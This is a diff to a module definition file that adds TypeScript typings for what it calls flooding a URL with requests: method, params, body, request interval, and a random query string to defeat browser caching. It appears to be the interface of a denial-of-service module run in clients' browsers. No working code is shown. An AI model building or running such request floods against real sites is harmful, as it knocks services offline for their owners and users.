@@ -15,15 +15,34 @@ params:
   optional: true
   # Typescript d.ts typings, used in the interface's code editor
   typings: |
-    {
+    string | {
       /**
-        * aex
-        */
-      jj: string
+       * The URL to flood with requests
+       */
+      url?: string
+      /**
+       * The HTTP method to use
+       */
+      method?: 'GET' | 'POST'
+      /**
+       * The url query parameters
+       */
+      params?: any
+      /**
+       * The request body
+       */
+      body?: any
+      /**
+       * Time interval in-between requests
+       */
+      interval?: number
+      /**
+       * Whether to append a random query string to the end of the URL or not.
+       * If you disable this, the client's browser will cache requests
+       */
+      random?: boolean
     }
 
 # Module callback
 returns: |
-  {
-    t: boolean
-  }
+  boolean
